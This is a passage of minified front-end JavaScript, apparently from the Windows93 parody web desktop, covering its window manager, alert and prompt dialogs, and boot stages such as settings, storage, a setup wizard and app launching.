w100",n.appendChild(e.actionZone),n.appendChild(e.btn),e.actionZone=n,e.btn.onclick=function(n){n.preventDefault(),setTimeout((function(){$explorer($extend({path:"/",browse:!0,onclose:function(t,n){t&&(e.input.value=n,$el(e.input).trigger("change"))}},t))}),0)},e},$form.plugin.icon=function(e,t){document.createElement("div");var n=document.createElement("button");function o(){n.style.backgroundImage="url("+e.input.value+")"}return n.type="button",n.className="block left mr10 h50p w50p",n.style.backgroundRepeat="no-repeat",n.style.backgroundPosition="center",n.style.backgroundSize="32px 32px",e.input.value||(e.input.value="/c/sys/skins/w93/shortcut.png"),e.input.value=$fs.utils.normalizeIcon(e.input.value),o(),n.onclick=function(n){n.preventDefault(),setTimeout((function(){$explorer($extend({path:"/c/files/images/icons/",accept:"image/*",browse:!0,onclose:function(t,n){t&&(e.input.value=n,o())}},t))}),0)},setTimeout((function(){var i=e.input.form;t&&t.watch&&i[t.watch]&&(i[t.watch].addEventListener("change",(function(t){if("/c/sys/skins/w93/shortcut.png"===e.input.value){var n,i=(this.value||"").split(" ")[0];(n=le._apps[i]&&le._apps[i].icon?le._apps[i].icon:$fs.utils.getIcon(this.value))&&"/c/sys/skins/w93/file.png"!==n&&(e.input.value=n,o())}}),!1),$el(i[t.watch]).trigger("change")),i.insertBefore(n,i.firstChild)}),0),e.div.classList.add("hide"),e}}(),function(e){"use strict";var t={title:"",html:"",help:"",url:null,menu:null,header:!0,footer:null,width:390,height:270,borderTopWidth:1,borderBottomWidth:1,borderLeftWidth:1,borderRightWidth:1,baseWidth:null,baseHeight:null,minWidth:null,minHeight:null,top:null,left:null,center:!1,noOut:!1,constrain:!1,ajax:!1,automaximize:!1,contextmenuOnBody:!1,resizable:!0,minimizable:!0,maximizable:!0,closable:!0,draggable:!0,dockable:!0,activable:!0,headerBtn:[],onopen:$noop,onready:$noop,onclose:$noop,onok:$noop,oncancel:$noop,onminimize:$noop,ondrag:$noop,ondragstop:$noop,onresize:$noop,onactive:$noop,ondestroy:$noop,animationIn:"",animationOut:"",baseClass:"",bodyClass:"",style:"",dest:document.body,dock:null},n=0,o=[],i=document.createElement("div"),r=document.createElement("header"),a=document.createElement("header"),s=document.createElement("section"),l=document.createElement("footer"),c=document.createElement("iframe"),u=document.createElement("img"),d=document.createElement("span"),f=document.createElement("button"),p=document.createElement("button"),m=document.createElement("button");function h(e){"string"==typeof e&&(e={title:e,url:e,ajax:!1,width:400,height:300});var g,_,b,w,x,$,E,k=$extend({},t,e),S=i.cloneNode(!1),L=r.cloneNode(!1),A=a.cloneNode(!1),N=s.cloneNode(!1),O=l.cloneNode(!1),C=n++,T=k.dest.offsetWidth,I=k.dest.offsetHeight;if(k.caller=$io.isWindow(this)?null:this,k.caller&&k.caller.that&&k.caller.that.window&&$extend(k,k.caller.that.window),e.contextmenu&&(k.contextmenu=$extend({},t.contextmenu,k.contextmenu)),S.id="ui_window_"+C,S.setAttribute("data-window-id",C),k.style)for(var j in k.style)k.style.hasOwnProperty(j)&&(S.style[j]=k.style[j]);if(k.baseClass){var R=k.baseClass.split(" ");$io.arr.all(R,(function(e){S.classList.add(e)}))}function P(e){var t=e.init.call(k);t&&(e.el=document.createElement("button"),e.el.className=(e.className||"ui_window__head__"+e.name)+("string"==typeof t?" "+t:""),e.title&&(e.el.title=e.title),e.el.onclick=function(t){e.action.call(g,t)},L.appendChild(e.el))}function D(e){e.preventDefault(),pe.show(g,{at:"left+10 bottom+10",of:e,within:k.dest})}function z(e){e.preventDefault(),pe.show(g,{of:this,within:k.dest})}if(k.contextmenuOnBody&&N.addEventListener("contextmenu",D,!1),k.header){if(k.icon){var M=u.cloneNode(!1);M.src=k.icon,M.addEventListener("click",z,!1),M.addEventListener("dblclick",me,!1),M.addEventListener("contextmenu",z,!1),L.appendChild(M)}var B=d.cloneNode(!1);if(B.textContent=k.title||"",S.setAttribute("aria-labelledby","ui_window__title_"+C),B.id="ui_window__title_"+C,L.appendChild(B),L.addEventListener("contextmenu",D,!1),k.headerBtn)for(var F=k.headerBtn.length-1;0<=F;F--)P(k.headerBtn[F]);if(k.minimizable&&k.dock&&k.dockable){var H=f.cloneNode(!1);H.onclick=ye,L.appendChild(H)}if(k.maximizable){var q=p.cloneNode(!1);q.onclick=he,L.appendChild(q)}if(k.closable){var W=m.cloneNode(!1);W.onclick=me,L.appendChild(W)}S.appendChild(L)}if((k.menu||k.beforeMenu||k.afterMenu)&&S.appendChild(A),k.beforeMenu&&("string"==typeof k.beforeMenu?(_=document.createElement("div")).innerHTML=k.beforeMenu:_=k.beforeMenu,A.appendChild(_)),k.menu){var U=document.createElement("div");A.appendChild(U),b=$menu(U,k.menu,{keyTarget:N,thisArg:k.menuThisArg||N,mode:"bar",position:{within:k.dest}})}function X(){var e=k.baseWidth?k.baseWidth:S.offsetWidth,t=k.baseHeight?k.baseHeight:S.offsetHeight,n=!1,o=!1;if(T<e&&(e=T,n=!0),I<t&&(t=I,o=!0),S.style.height=t+"px",S.style.width=e+"px",N.classList.add("ui_window__body--flex"),N.removeAttribute("style"),!0===k.minHeight?S.style.minHeight=S.style.height:k.minHeight&&(S.style.minHeight="auto"==k.minHeight?"auto":k.minHeight+"px"),!0===k.minWidth?S.style.minWidth=S.style.width:k.minWidth&&(S.style.minWidth="auto"==k.minWidth?"auto":k.minWidth+"px"),k.center)k.top=~~((I-t)/2)+"px",k.left=~~((T-e)/2)+"px";else{if(k.top)k.noOut&&k.top>I-t&&(k.maxTop=!0,k.top=I-t+"px",S.style.top=k.top);else{var i=~~(Math.random()*(I-t));k.top=i+"px"}if(k.left)k.noOut&&k.left>T-e&&(k.maxLeft=!0,k.left=T-e+"px",S.style.left=k.left);else{var r=~~(Math.random()*(T-e));k.left=r+"px"}}"-4000px"===S.style.top&&(S.style.top=o?0:k.top),"-4000px"===S.style.left&&(S.style.left=n?0:k.left)}if(k.afterMenu&&("string"==typeof k.afterMenu?(w=document.createElement("div")).innerHTML=k.afterMenu:w=k.afterMenu,A.appendChild(w)),S.appendChild(N),k.footer&&("string"==typeof k.footer?(x=document.createElement("div")).innerHTML=k.footer:x=k.footer,O.appendChild(x)),(k.footer||k.btnOk||k.btnCancel)&&S.appendChild(O),S.style.top=(k.top||-4e3)+"px",S.style.left=(k.left||-4e3)+"px",N.style.width="auto"==k.width?"auto":1*k.width+k.borderTopWidth+k.borderBottomWidth+"px",N.style.height="auto"==k.height?"auto":1*k.height+k.borderLeftWidth+k.borderRightWidth+"px",k.dest.appendChild(S),k.automaximize&&S.classList.add("ui_window--maximized"),k.draggable){(B||S).classList.add("ui_window--draggable");var Y=$drag(S,{constrain:k.constrain,handle:B||S,onstart:function(){h.active(C),v(this)},ondrag:function(e,t,n){k.ondrag.call(g,e,t,n)},onstop:function(){y(this),k.ondragstop.call(g,S,N)}})}if(k.resizable)var G=$resize(S,{handles:"all",start:function(e){h.active(C),v(e)},stop:function(e){y(e),k.onresize.call(g,S,N)}});if(k.bodyClass){var Z=k.bodyClass.split(" ");$io.arr.all(Z,(function(e){N.classList.add(e)}))}if("random"==k.animationIn&&(k.animationIn=$io.arr.random($animate.i)),"random"==k.animationOut&&(k.animationOut=$io.arr.random($animate.o)),k.animationIn&&(S.classList.add("animated"),$animate(S,k.animationIn,(function(e){S.classList.remove("animated")}))),k.btnCancel||k.btnOk){var K=document.createElement("div");K.className="ui_window__buttons",O.appendChild(K)}function V(e){this.classList.contains("ui_window_docked--minimized")?(_e(),S.classList.contains("ui_window--active")||h.active(C)):S.classList.contains("ui_window--active")?(k.minimizable&&ye(),S.style.zIndex=$maxZ("#ui_explorer_0 .ui_icon,.ui_window,.ui_z_indexed").num+10):h.active(C)}function J(e){e.preventDefault(),pe.show(g,{at:"left+10 bottom+10",of:e,within:k.dest})}if(k.btnCancel&&(($=document.createElement("button")).innerHTML=k.btnCancel,$.className="ui_window__cancel",K.appendChild($)),k.btnOk&&((E=document.createElement("button")).innerHTML=k.btnOk,E.setAttribute("autofocus","autofocus"),E.className="ui_window__ok",K.appendChild(E)),k.dock&&k.dockable){var Q=document.createElement("button"),ee=document.createElement("img"),te=document.createElement("span");Q.className="ui_window_docked",Q.id="ui_window_docked_"+C,ee.className="ui_window_docked__icon",te.className="ui_window_docked__text ui_elipsis",k.icon&&(ee.src=k.icon,Q.appendChild(ee)),k.title&&(te.textContent=k.title,Q.title=k.title,Q.appendChild(te)),k.dock.appendChild(Q),Q.addEventListener("click",V,!1),Q.addEventListener("contextmenu",J,!1)}var ne,oe,ie=!1;function re(e){!(ie=!0)!==k.onok.call(g,ie)&&me(e)}function ae(){h.active(C)}function se(){Q&&(Q.removeEventListener("click",V,!1),Q.removeEventListener("contextmenu",J,!1),Q&&Q.parentNode&&Q.parentNode.removeChild(Q)),M&&(M.removeEventListener("click",z,!1),M.removeEventListener("dblclick",me,!1),M.removeEventListener("contextmenu",z,!1)),k.contextmenuOnBody&&N.removeEventListener("contextmenu",D,!1),k.header&&L.removeEventListener("contextmenu",D,!1),k.btnCancel&&$.removeEventListener("click",me,!1),k.btnOk&&E.removeEventListener("click",re,!1),ve&&ve.parentNode&&ve.parentNode.removeChild(ve),ve=null,k.resizable&&B&&$el(B).off("dblclick doubletap",he),k.maximizable&&!B&&$el(N).off("dblclick doubletap",he),k.draggable&&Y.destroy(),k.resizable&&G.destroy(),b&&b.destroy(),pe&&pe.destroy(),S.removeEventListener("click",ae,!1),S&&S.parentNode&&S.parentNode.removeChild(S);var e=$maxZ(".ui_window").el;e&&h.active(1*e.getAttribute("data-window-id")),k.ondestroy.call(g,e),o[C]=null}function le(){if(k.animationOut){for(var e=!1,t=0,n=S.classList.length;t<n;t++)S.classList[t]&&0===S.classList[t].indexOf("fx_")&&(e=!0);e?se():(S.classList.add("animated"),$animate(S,k.animationOut,(function(e){S.classList.remove("animated"),se()})))}else se()}function ce(){ie&&k.onsubmit&&!1===k.onsubmit.call(g,ie,$form.data(ne),ne)?ie=!1:k.onbeforeclose?k.onbeforeclose.call(g,(function(){le(),k.onclose&&k.onclose.call(g,ie,$form.data(ne),ne)})):(le(),k.onclose&&k.onclose.call(g,ie,$form.data(ne),ne))}function ue(e){!0===e&&(ie=!0),ne?ce():k.onbeforeclose?k.onbeforeclose.call(g,(function(){le(),k.onclose&&k.onclose.call(g,ie)})):(le(),k.onclose&&k.onclose.call(g,ie))}function de(){X(),setTimeout((function(){if(X(),ne=S.getElementsByTagName("form")[0]){var e=ne.querySelector("[autofocus]");e&&e.focus(),ne.onsubmit=function(){return ie=!0,ce(),!1},g.el.form=ne}else oe?oe.focus():N.focus();k.onready.call(g,S,N)}),1)}k.btnCancel&&$.addEventListener("click",(function(e){!1!==k.oncancel.call(g,ie)&&me(e)}),!1),k.btnOk&&E.addEventListener("click",re,!1),k.activable&&S.addEventListener("click",ae,!1),k.resizable&&B&&$el(B).on("dblclick doubletap",he),k.maximizable&&!B&&$el(N).on("dblclick doubletap",he),k.url&&!k.ajax?((oe=c.cloneNode(!1)).onload=de,oe.onerror=de,oe.onabort=de,oe.src=0==k.url.indexOf("www")?"http://"+k.url:k.url,N.appendChild(oe),N.classList.add("ui_window__body--with_iframe"),k.title||(k.title=k.url)):k.url&&k.ajax?$ajax.get(k.url).done((function(e){var t=document.createElement("div");t.innerHTML=e,N.appendChild(t),de()})).fail((function(){$alert.error("ajax error")})):(k.ajax||("string"==typeof k.html?N.innerHTML=k.html:1!==k.html.nodeType&&11!==k.html.nodeType||N.appendChild(k.html)),de()),g=h.current=o[C]={id:C,cfg:k,el:{base:S,body:N,header:L,title:B,footer:O,iframe:oe,form:ne,btnCancel:$,btnOk:E,menu:A,menubar:U,beforeMenu:_,afterMenu:w},close:ue,destroy:se,maximize:he,minimize:ye,restore:_e,menu:b,changeSize:function(e,t){e&&(e.height||e.width)&&(S.style.height="auto",S.style.width="auto",N.classList.remove("ui_window__body--flex"),e.height&&(N.style.height=e.height+"px"),e.width&&(N.style.width=e.width+"px"),X(),t&&t())},active:function(){h.active(this.id)},changeTitle:function(e){"string"==typeof e&&(B&&(B.innerHTML=e),te&&(te.innerHTML=e,te.title=e))},changeIcon:function(e){"string"==typeof e&&(M&&(M.src=e),ee&&(ee.src=e))},changeFooter:function(e){O.firstChild&&(O.firstChild.innerHTML=e)}},b&&b.refresh($extend(k.menuThisArg||{},{window:g})),k.onopen.call(g,S,N),k.activable&&h.active(C);var fe,pe=$menu(N,$menu.extend([{name:"Maximize",disabled:!k.maximizable,action:function(){g.maximize()}},{name:"Minimize",disabled:!k.minimizable,action:function(){g.minimize()}},{name:"Move to center",disabled:!k.draggable,action:function(){T=k.dest.offsetWidth,I=k.dest.offsetHeight,S.style.top=~~((I-S.offsetHeight)/2)+"px",S.style.left=~~((T-S.offsetWidth)/2)+"px"}},{name:"Refresh",disabled:!((!k.url||k.ajax)&&"function"==typeof k.reload),action:function(){"function"==typeof this.cfg.reload?this.cfg.reload():this.el.iframe&&(this.el.iframe.src="",this.el.iframe.src=this.cfg.url)}},{name:"---"},{name:"Close",disabled:!k.closable,action:function(){g.close()}}],k.contextmenu),{trigger:!1,thisArg:g});function me(e){e.stopPropagation(),e.stopImmediatePropagation(),ue()}function he(e){e&&(e.stopPropagation(),e.stopImmediatePropagation()),S.classList.contains("ui_window--maximized")?(S.classList.remove("ui_window--maximized"),q&&(q.classList.remove("ui_window__head__maximized"),q.classList.add("ui_window__head__maximize")),S.classList.add("untransition"),S.removeAttribute("style"),S.setAttribute("style",fe),setTimeout((function(){S.classList.remove("untransition"),k.onresize(!1)}),500)):(fe=S.getAttribute("style"),S.classList.add("ui_window--maximized"),q&&(q.classList.add("ui_window__head__maximized"),q.classList.remove("ui_window__head__maximize")),setTimeout((function(){k.onresize(!0)}),500))}var ge,ve=document.createElement("div");function ye(){if(k.dockable){var e=S.getBoundingClientRect();ge={t:e.top+"px",l:e.left+"px",h:S.offsetHeight+"px",w:S.offsetWidth+"px"},ve.style.display="block",ve.style.top=ge.t,ve.style.left=ge.l,ve.style.height=ge.h,ve.style.width=ge.w,ve.style.zIndex=$maxZ("#ui_explorer_0 .ui_icon,.ui_window,.ui_z_indexed").num+1,S.classList.add("ui_window--minimized");var t=Q.getBoundingClientRect();ve.style.top=t.top+"px",ve.style.left=t.left+"px",ve.style.height=Q.offsetHeight+"px",ve.style.width=Q.offsetWidth+"px",setTimeout((function(){ve.style.display="none",Q.classList.add("ui_window_docked--minimized")}),300)}}function _e(){ve.classList.remove("ui_window_transfer"),ve.style.display="block",ve.style.zIndex=$maxZ("#ui_explorer_0 .ui_icon,.ui_window,.ui_z_indexed").num+1,ve.classList.add("ui_window_retransfer"),setTimeout((function(){ve.style.top=ge.t,ve.style.left=ge.l,ve.style.height=ge.h,ve.style.width=ge.w}),50),setTimeout((function(){ve.style.display="none",S.classList.remove("ui_window--minimized"),Q.classList.remove("ui_window_docked--minimized")}),300)}return ve.className="ui_window_transfer",document.body.appendChild(ve),g}i.setAttribute("role","dialog"),i.className="ui_window ui_window--active",r.className="ui_window__head",u.className="ui_window__head__icon",d.className="ui_window__head__title ui_elipsis",f.className="ui_window__head__minimize",p.className="ui_window__head__maximize",m.className="ui_window__head__close",a.className="ui_window__menu",s.className="ui_window__body",l.className="ui_window__foot",c.className="ui_window__iframe",c.setAttribute("allowfullscreen","true");var g=document.createElement("div");function v(e){e.getElementsByTagName("iframe").length&&e.getElementsByTagName("section")[0].appendChild(g.cloneNode(!1))}function y(e){var t=e.querySelector(".js-mask");t&&t.parentNode&&t.parentNode.removeChild(t)}function _(e,t){var n=t&&1==t.nodeType?t.getAttribute("data-window-id"):t,i=o[1*n];i&&i[e]()}g.className="js-mask",g.setAttribute("style","background-image:url(/c/sys/img/spacer.gif); position: absolute; z-index: 2; left: 0; top: 0; right: 0; bottom: 0;"),h.config=function(e){$extend(t,e)},h.instances=o,h.active=function(e){var t=document.getElementById("ui_window_"+e);t.style.zIndex=$maxZ("#ui_explorer_0 .ui_icon:not(.ui_is_dragging),.ui_window,.ui_z_indexed").num+1,$io.arr.all(document.querySelectorAll(".ui_window--active"),(function(e){e.classList.remove("ui_window--active"),v(e)})),$io.arr.all(document.querySelectorAll(".ui_window_docked.pressed"),(function(e){e.classList.remove("pressed")})),t.classList.add("ui_window--active"),y(t);var n=document.getElementById("ui_window_docked_"+e);n&&n.classList.add("pressed"),h.current=o[e],setTimeout((function(){o[e]&&"function"==typeof o[e].cfg.onactive&&o[e].cfg.onactive.call(o[e],o[e].el.base,o[e].el.body)}),1)},h.close=function(e){_("close",e)},h.destroy=function(e){_("destroy",e)},h.maximize=function(e){_("maximize",e)},h.restore=function(e){_("restore",e)},e.$window=h}(this),function(e){"use strict";var t={baseClass:"ui_alert",height:"auto",minHeight:"auto",footer:"",minimizable:!1,maximizable:!1,resizable:!1,center:!0,pinnable:!1,btnOk:"OK",animationIn:"none",animationOut:"random",width:330},n={sound:$noop};function o(e,o){var i=$extend({title:"Alert",baseClass:"ui_alert",msg:e,img:"/c/sys/skins/w93/alert.png",cb:o,sound:"alert",onopen:function(){this.cfg.sound&&n.sound(this.cfg.sound);var e=u||this.el.btnOk;e&&setTimeout((function(){e.focus()}),100)},onactive:function(){var e=u||this.el.btnOk;e&&setTimeout((function(){e.focus()}),100)},onclose:function(t){(o||e.cb||$noop)(t)}},e),r=i.baseClass.split(" ")[0];if("string"!=typeof i.msg)try{i.msg=JSON.stringify(i.msg,null,2),i.bodyClass=t.bodyClass+" "+r+"--code"}catch(a){i.msg=i.msg+"",i.bodyClass=t.bodyClass+" "+r+"--code "+r+"--center"}var a=document.createElement("div"),s=document.createElement("div");if(document.createDocumentFragment(),a.className="clearfix",i.img){var l=new Image;l.className=r+"__img",l.width=32,l.height=32,a.appendChild(l)}if(s.innerHTML=i.msg,s.className=r+"__text",a.appendChild(s),"string"==typeof i.prompt){var c=document.createElement("form"),u=document.createElement("textarea");u.style.width="100%",u.value=i.prompt,u.name="prompt",u.onkeydown=function(e){if("number"!=typeof(e=e||window.event).which&&(e.which=e.keyCode),13===e.which&&!e.shiftKey)return $el(c).trigger("submit"),e.preventDefault?e.preventDefault():e.returnValue=!1,e.stopPropagation?e.stopPropagation():e.cancelBubble=!0,e.stopImmediatePropagation(),!1},c.appendChild(u),s.appendChild(c),s.style.textAlign="left"}i.html=a;var d;if(!i.img)return $window($extend({},t,i));var f=!1;d=function(){f||$window($extend({},t,i)),f=!0},l.onload=d,l.onerror=d,l.onabort=d,l.src=i.img}o.error=$io.fn.leading((function(e,t){console.error(e);var n=$error(e),i={bodyClass:"js_error",title:n.name||"Error",msg:n.html};o($extend({title:"Error",msg:i,img:"/c/sys/skins/w93/error.png",cb:t,sound:"error"},i))}),1e3),o.info=function(e,t){o($extend({title:"Info",msg:e,img:t||"/c/sys/skins/w93/info.png",onopen:$noop,sound:null},e))},o.progress=function(e,n){var o=document.createElement("div"),i=document.createElement("div");i.className="ui_progress__bar",o.className="skin_inset_deep h20p mt5 relative ui_progress";var r=document.createElement("div"),a=document.createElement("div");r.textContent=e,o.appendChild(i),a.appendChild(r),a.appendChild(o),n=n||"Progress";var s=$window($extend({},t,{title:n,html:a,btnOk:null},e));return{update:function(e){e=~~e,s.changeTitle(e+"% - "+n),i.style.width=e+"%",100<=e&&s.close()}}},o.help=function(e,n){$window($extend({},t,{title:"Help",html:e,bodyClass:"ui_alert--help skin_inset_deep skin_light pa10",sound:null},e))},$window.form=function(e,n,o){"string"!=typeof e&&(o=n,n=e,e="Form");var i=$form.build(n);$window.call(this,$extend({},t,{resizable:!0,title:e,html:i.el,btnOk:"OK",btnCancel:"Cancel",onsubmit:function(e,t,n){var i=$form.validate(n);if(!i)return console.log(i),!1;(o||$noop)(e,t)}}))},o.config=function(e){$extend(n,e)},e.$alert=o,e.$confirm=function(e,t){o($extend({title:"Confirm",msg:e,img:"/c/sys/skins/w93/question.png",onopen:$noop,sound:null,cb:t,btnCancel:"Cancel"},e))},e.$prompt=function(e,t,n){"function"==typeof t&&(n=t,t=""),o($extend({title:"Prompt",msg:e,img:null,sound:null,cb:n,prompt:t,onclose:function(t,o){var i=o.prompt;(n||e.cb||$noop)(t,i)},btnCancel:"Cancel"},e))}}(this);var system42=$kernel;system42("boot",(function(e,t){"use strict";Promise.all([$loader([e._temp.files,e._temp.mimetypes]),$loader.audio(e._settings.sounds.boot),$loader.audio(e._settings.sounds.alert),$loader.audio(e._settings.sounds.error)]).then((function(n){e._files=n[0][0],e._get.mime.ext=n[0][1],e._sound.boot=n[1],e._sound.alert=n[2],e._sound.error=n[3],t()}))})),system42("bios",(function(e){"use strict";$boot.BOOTLOG.innerHTML+="\nWindows93 v"+$boot.VERSION+" booting on...",$boot.BOOTLOG.innerHTML+="\n"+platform.description,$boot.BOOTLOG.innerHTML+="\n"})),system42("settings",(function(e){"use strict";var t=Object.assign({},e._settings);e._settings=$store("settings.json",e._settings,(function(t){e._settings=t}),(function(){return e._settings})),"string"==typeof e._settings?e._settings=t:e._settings=Object.assign(t,e._settings),e._settings.skin="w93",e._init.home=function(){e._path.home="/a/",e._path.key.home="",e._path.desktop="/a/desktop/",e._path.key.desktop="desktop/",e._path.skin="/c/sys/skins/"+e._settings.skin+"/"},e._init.home()})),system42("storage",(function(e,t){"use strict";var n={},o=Date.now();function i(t,i){n[t.name]={};var r=$extend({},t);-1<r.col&&(n[t.name].x=r.col*e._icons.w,delete r.col),-1<r.row&&(n[t.name].y=r.row*e._icons.h,delete r.row),n[t.name].time=o+i,delete r.name,$store.set(e._path.key.desktop+t.name,r)}e._init.desktop=function(){$io.arr.each(e._temp.defaultDesk,i)},$store.set("system32.dll","796f 2c20 706c 6561 7365 2064\n6f6e 2774 2064 656c 6574 6520\n6d65"),$store.set("boot/README.txt","README\n======\n\nAny javascript or css file in this folder will be loaded at boot.\n\nUse with care and have fun...\n\nwindows93.net's staff"),e._init.desktop(),e._desktop=$store(e._path.key.home+".config/desktop.json",n,(function(t){e._desktop=t}),(function(){return e._desktop})),$io.enum([$io.obj.flatten(e._files.a,"/")],(function(e,t,n){if("number"==typeof e){var o=$fs.utils.isShortcut(t);$ajax.get("a_/"+t,{arraybuffer:!o}).done((function(e){o?($store.set(t,e),n()):$io.ArrayBuffer.Blob(e,(function(e){$db.set(t,e,n)}),$fs.utils.getMime(t))})).fail((function(e){$boot.onerror(e),n()}))}else $db.set(t+"/",null,n)}),(function(){$file.scan("/a/",(function(){if("#safe"!==window.location.hash&&e&&e._files&&e._files.a&&e._files.a.boot){var n=Object.keys(e._files.a.boot);if(n.length)return void setTimeout((function(){if(window.system42){if(window.system42.paused)return t();var e=[];n.forEach((function(t){!1!==$fs.utils.exist("/a/boot/"+t)&&e.push(new Promise((function(e){$file.open("/a/boot/"+t,"URL",(function(n,o){var i=$url.getExtention(t);"js"===i?$loader.script(n).then(e):"css"===i?$loader.css(n).then(e):e()}))})))})),Promise.all(e).then((function(e){!0!==$boot.hasError&&t()}))}}),500)}t()}))}))})),system42("reset",(function(e,t){"use strict";$store.clear(),$db.clear((function(){t()}))})),system42("audio",(function(e){"use strict";window.Howl=window.Howl||function(){this.play=$noop,this.pause=$noop};var t={};function n(n,o){var i;return"string"!=typeof n?new Howl(n):(e._settings.sounds[n]&&(n=e._settings.sounds[n]),t[n]?i=t[n]:(i=new Howl({buffer:!!o,urls:[n]}),t[n]=i),i)}n.config=function(e){return new Howl(e)},n.stream=function(e){return n(e,!0)},window.$audio=n})),system42("splash",(function(e,t){"use strict";var n;$explorer(e._path.desktop,e._dom.desktop,{silent:!0,backgroundClass:"",viewType:"workspace"}),e.devmode||$el.each(".ui_icon",(function(e){e.classList.add("hide")})),e.started||!0===e._settings.noSplash?t():(n=document.createElement("iframe"),e._dom.splash.appendChild(n),n.className="fillspace",n.style.position="fixed",n.style.visibility="hidden",n.onload=function(){n.style.visibility="visible",setTimeout((function(){t()}),2500)},n.src=e._temp.splash)})),system42("utils",(function(e){"use strict";var t={};$io.obj.each(e._get.mime.ext,(function(e,n){$io.obj.each(e,(function(e,o){$io.arr.all(e[0].split(","),(function(e){t[e]=n+"/"+o}))}))})),e._get.ext.mime=t,$io.obj.each(e._apps,(function(t,n){if("string"!=typeof t){if(t.accept&&$extend(t,$fs.utils.parseAccept(t.accept)),t.ext&&$io.arr.all(t.ext,(function(t){e._get.ext.apps[t]?e._get.ext.apps[t].push(n):e._get.ext.apps[t]=[n]})),t.mimetype&&e._get.mime.apps.push([t.mimetype,n]),t.icon&&(t.icon=$fs.utils.normalizeIcon(t.icon)),t.install&&system42.on("storage:ready",(function(e){t.install=t.install.replace(/^~\//,"/a/"+e._path.key.home),$io.obj.path.call("/",e._files,t.install,{exe:n,icon:t.icon})})),t.init&&system42.on("config:ready",(function(e){t.init.call({le:e,app:t})})),t.exec){var o=t.exec,i=$io.fn.arg(o);t.exec=function(){var e=t.icon;this.arg.options&&this.arg.options.icon&&(e=this.arg.options.icon=$fs.utils.normalizeIcon(this.arg.options.icon||this.arg.launcher.icon)),this.app=t,this.that.window||(this.that.window={}),this.that.window.icon||(this.that.window.icon=e),this.that.window.title||(this.that.window.title=this.arg.launcher?this.arg.launcher.title:t.name),this.that.window.title||delete this.that.window.title;var n,r=this.arg.arguments.concat([this.arg.options]);"arguments"===t.inject?r=this.arg.arguments:$io.arr.each(i,(function(e,t){"url"===e&&"string"!=typeof r[t]&&(r[t]=""),"opt"===e&&"object"!=typeof r[t]&&(r[t]={})}));try{n=void 0===(n=o.apply(this,r))?1:n}catch(e){$alert.error(e),n=0}return n}}}else e._apps[n]={alias:t,exec:function(){for(var e=[],n=0,o=arguments.length;n<o;n++)"string"==typeof arguments[n]&&e.push(arguments[n]);$exe.silent(t+" "+e.join(" "))}}}))})),system42("config",(function(e){"use strict";var t,n=document.createElement("style");document.head.appendChild(n),t=n.sheet;var o=[];$io.arr.all(document.styleSheets,(function(e){/sys42/.test(e.href)&&$io.arr.all(e.rules||e.cssRules,(function(e){e.selectorText&&/^\.fx_\w+/.test(e.selectorText)&&o.push(e.selectorText.replace(".fx_",""))}))})),$el.each("filter",(function(e){o.push(e.id.replace("fx_","")),t.insertRule("."+e.id+' {-webkit-filter: url("#'+e.id+'");}',0),t.insertRule("."+e.id+' {filter: url("#'+e.id+'");}',0)})),e._fx=o.sort(),$window.config({dest:e._dom.desktop,dock:document.getElementById("s42_dock"),ondestroy:function(t){!t&&e._selected.length&&e._selected[0].focus()},animationIn:e.devmode?"":"random",animationOut:e.devmode?"":"random",contextmenu:{"before:Close":[{name:"Glitch",action:function(){$exe.call({silent:!0},"glitch",this.el.base)}},{name:"IE6",action:function(){$exe.call({silent:!0},"ie6",this.el.base)}},{name:"---"},{name:"FX",items:function(){var t=this,n=[];return $io.arr.all(["none"].concat(e._apps.fx.effects),(function(e){t.fx||(t.fx="none"),n.push({name:e,radio:"FX_list",selected:t.fx===e,action:function(n){t.fx=e,t.el.base.className=t.el.base.className.replace(/fx_\w+/,""),"none"!==e&&$exe.call({silent:!0},"fx",e,t.el.base)}})})),n}},{name:"---"}]},headerBtn:[{name:"help",init:function(){return!!this.help},action:function(){$alert.info(this.cfg.help)}},{name:"pin",title:"pin this window (it will reopen each time you boot windows93)",init:function(){},action:function(t){var n=t.target;if(this.cfg.caller.that.pinned)delete e._pins[this.cfg.caller.that.pinned],this.cfg.caller.that.pinned=null,n.classList.remove("pressed");else{var o=this.el.body.offsetWidth,i=this.el.body.offsetHeight,r=this.el.base.offsetTop,a=this.el.base.offsetLeft;e._pins.push([this.cfg.caller.arg.command,{width:o,height:i,top:r,left:a}]),$route(""),n.classList.add("pressed")}}}]}),$screenshot.config({default:e._dom.screen}),$notif.config({default:e._dom.clock,dest:e._dom.desktop}),$alert.config({sound:function(t){t&&e._sound[t]&&e._sound[t].play()}})})),system42("register",(function(e,t){"use strict";function n(){e._dom.splash.classList.remove("hide"),e._init.home(),t()}if(!1===e._settings.userData.localInit){e._dom.splash.classList.add("hide");var o=function(){var t=document.getElementById("WELCOME"),o=document.getElementById("TERMS"),i=document.getElementById("PROMPT"),r=document.getElementById("USERNAME");if(document.getElementById("SERIAL"),o.classList.contains("hide")&&i.classList.contains("hide"))t.classList.add("hide"),o.classList.remove("hide"),this.el.btnOk.innerHTML="Didn't Read Lol ^^";else{if(!i.classList.contains("hide"))return e._settings.userData.nick=r.value||"anonymous",e._settings.userData.localInit=!0,n(),!0;o.classList.add("hide"),i.classList.remove("hide"),this.el.btnOk.innerHTML="Let's ROCK"}return!1};$window({url:"/wizard.php",ajax:!0,title:"Setup Wizard",btnCancel:"Nope",animationIn:"flip",animationOut:"",center:!0,height:350,width:510,btnOk:"Cool Story, Bro",onok:o,oncancel:o})}else n()})),system42("reveal",(function(e,t){"use strict";e.devmode||e._sound.boot.play(),setTimeout((function(){e._dom.splash.parentNode.removeChild(e._dom.splash),e._dom.taskbar.classList.remove("hide"),e._dom.desktop.classList.remove("invisible"),e.devmode||setTimeout((function(){$el.each(".ui_icon",(function(e){setTimeout((function(){e.classList.remove("hide")}),Math.abs(1e3*Math.random())+100)}))}),100),$el(e._dom.desktop).on("click",".js_error a",(function(e){return e.target.href&&$exe("code",e.target.href),!1})),$el(e._dom.screen).on("drag dragenter dragover dragleave drop",(function(e){e.preventDefault()})),$route.on("change",(function(e){$exe(e)})),$route.init(),document.documentElement.focus(),window.onerror=function(){$alert.error(arguments)},t()}),e.devmode?0:600)})),system42("exe",(function(e){"use strict";var t=e._apps;function n(t,n){var i=this||{},r=i&&i.cli;return!0!==t.terminal||r?t.exec.apply({le:e,that:i,cli:r?i:null,arg:n}):o.call(this,"terminal","",{onopen:function(o){setTimeout((function(){t.exec.apply({le:e,that:i,cli:o,arg:n})}),100)}}),!0}function o(e,a,s){if(e&&"string"==typeof 